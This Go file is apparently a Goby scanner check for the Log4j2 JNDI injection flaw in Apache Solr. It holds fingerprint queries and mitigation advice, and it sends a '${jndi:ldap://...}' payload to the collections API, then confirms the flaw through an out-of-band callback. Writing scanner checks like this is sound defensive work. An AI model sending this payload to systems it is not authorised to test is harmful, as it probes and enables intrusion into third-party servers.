package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Solr collections file action parameter Log4j2 command execution vulnerability",
    "Description": "<p>Apache Solr is an open source search service, developed using the Java language, mainly based on HTTP and Apache Lucene.</p><p>Apache Solr has Log4j2 jndi injection command execution vulnerability. Attackers can use this feature to construct special data request packets through this vulnerability, and ultimately trigger remote code execution.</p>",
    "Impact": "Apache Solr collections file action parameter Log4j2 command execution vulnerability",
    "Recommendation": "<p>1. Upgrade to log4j-2.16.0-rc1: </p><p> Download address: <a href=\"https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1\">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1</a></p><p> 2. Emergency mitigation measures:</p><p>(1) Modify the jvm parameter -Dlog4j2.formatMsgNoLookups=true</p><p>(2) Modify the configuration log4j2.formatMsgNoLookups=True</p><p>( 3) Set the system environment variable FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS to true</p>",
    "Product": "Apache Solr",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache Solr collections 文件 action参数 Log4j2 命令执行漏洞",
            "Description": "<p>Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。<br></p><p><span style=\"font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Apache Solr</span> 存在 Log4j2 jndi 注入命令执行漏洞，攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。</span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Apache Solr</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">&nbsp;存在 Log4j2 jndi 注入命令执行漏洞，攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。</span><br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">1、升级至 log4j-2.16.0-rc1：</span><br></p><p>&nbsp;下载地址：<a href=\"https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1\">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1</a></p><p>2、紧急缓解措施：</p><p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups=true</p><p>（2） 修改配置 log4j2.formatMsgNoLookups=True</p><p>（3） 将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>",
            "Product": "Apache Solr",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache Solr collections file action parameter Log4j2 command execution vulnerability",
            "Description": "<p>Apache Solr is an open source search service, developed using the Java language, mainly based on HTTP and Apache Lucene.</p><p>Apache Solr has Log4j2 jndi injection command execution vulnerability. Attackers can use this feature to construct special data request packets through this vulnerability, and ultimately trigger remote code execution.</p>",
            "Impact": "Apache Solr collections file action parameter Log4j2 command execution vulnerability",
            "Recommendation": "<p>1. Upgrade to log4j-2.16.0-rc1: <br></p><p>&nbsp;Download address: <a href=\"https://github.com/apache/logging-log4j2/ releases/tag/log4j-2.16.0-rc1\">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1</a></p><p> 2. Emergency mitigation measures:</p><p>(1) Modify the jvm parameter -Dlog4j2.formatMsgNoLookups=true</p><p>(2) Modify the configuration log4j2.formatMsgNoLookups=True</p><p>( 3) Set the system environment variable FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS to true</p>",
            "Product": "Apache Solr",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || (banner=\"/solr/\" && banner=\"Location\" && banner!=\"couchdb\" && banner!=\"drupal\"))",
    "GobyQuery": "(title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || (banner=\"/solr/\" && banner=\"Location\" && banner!=\"couchdb\" && banner!=\"drupal\"))",
    "Author": "Chin",
    "Homepage": "https://solr.apache.org/index.html",
    "DisclosureDate": "2021-12-14",
    "References": [],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10245"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			payload := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			payload = url.QueryEscape(payload)
			cfg := httpclient.NewGetRequestConfig("/solr/admin/collections?action=" + payload)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			httpclient.DoHttpRequest(u, cfg)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			return expResult
		},
	))
}
